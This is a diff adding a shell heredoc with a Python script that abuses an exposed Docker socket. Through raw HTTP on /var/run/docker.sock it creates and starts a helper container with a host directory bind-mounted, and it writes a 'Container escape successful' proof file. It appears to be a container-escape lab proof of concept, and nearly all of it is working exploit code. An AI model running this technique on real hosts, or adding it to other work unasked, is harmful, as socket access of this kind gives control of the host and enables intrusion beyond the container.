@@ -1,0 +1,67 @@
+python3 - <<'PY'
+import socket
+import json
+
+sock_path = "/var/run/docker.sock"
+
+def request(method, path, body=None):
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.connect(sock_path)
+
+    if body is not None:
+        body = json.dumps(body)
+        request_data = (
+            f"{method} {path} HTTP/1.1\r\n"
+            "Host: localhost\r\n"
+            "Content-Type: application/json\r\n"
+            f"Content-Length: {len(body.encode())}\r\n"
+            "Connection: close\r\n\r\n"
+            f"{body}"
+        )
+    else:
+        request_data = (
+            f"{method} {path} HTTP/1.1\r\n"
+            "Host: localhost\r\n"
+            "Connection: close\r\n\r\n"
+        )
+
+    s.sendall(request_data.encode())
+
+    response = b""
+    while True:
+        data = s.recv(8192)
+        if not data:
+            break
+        response += data
+
+    s.close()
+    return response
+
+config = {
+    "Image": "container-lab-app",
+    "Cmd": [
+        "sh",
+        "-c",
+        "echo 'Container escape successful' > /proof/escape.txt"
+    ],
+    "HostConfig": {
+        "Binds": [
+            "/tmp/container-lab-proof:/proof"
+        ]
+    }
+}
+
+response = request("POST", "/containers/create", config)
+print(response.decode())
+
+header, body = response.split(b"\r\n\r\n", 1)
+result = json.loads(body)
+
+container_id = result["Id"]
+print("Helper container:", container_id)
+
+response = request("POST", f"/containers/{container_id}/start")
+print(response.decode())
+
+print("Helper container started.")
+PY
